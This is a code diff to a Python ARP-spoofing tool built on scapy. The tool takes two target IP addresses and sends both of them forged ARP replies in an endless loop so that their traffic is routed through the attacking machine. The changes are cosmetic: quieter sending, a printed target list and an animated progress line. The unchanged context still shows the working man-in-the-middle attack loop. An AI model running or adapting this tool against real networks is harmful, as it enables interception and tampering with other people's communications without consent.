@@ -6,6 +6,9 @@ import time
 import subprocess
 import sys
 
+CURSOR_UP_ONE = "\x1b[1A"
+ERASE_LINE = '\x1b[2K'
+
 def getArguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t1", "--target1", dest="targetIP1", help="Enter an IP Address to spoof.")
@@ -24,7 +27,7 @@ def getMAC(ip):
 
 def send_ARP_packet(targetIP, targetMAC, spoofIP):
     packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
 def enableIPforwarding():
@@ -44,12 +47,19 @@ def packetLoop(targetIP1, targetIP2):
         print("[-] Please input a valid IP address for target 2 with the -t2 option.")
         sys.exit()
 
+    print("\n[+] Packets are being sent to:\n")
+    print("1. " + targetIP1)
+    print("2. " + targetIP2)
+    print("\n Press CTRL + C to exit out of the program and stop sending packets to the targets.\n")
+
     while True:
         send_ARP_packet(targetIP1, targetMAC1, targetIP2)
-        print("[+] A packet was sent to target IP: " + targetIP1)
         send_ARP_packet(targetIP2, targetMAC2, targetIP1)
-        print("[+] A packet was sent to target IP: " + targetIP2)
-        time.sleep(2)
+        for x in range (1,4):
+            b = "Packets are being sent" + "." * x
+            print (b, end="\r")
+            time.sleep(0.5)
+        sys.stdout.write(ERASE_LINE)
 
 
 def main():
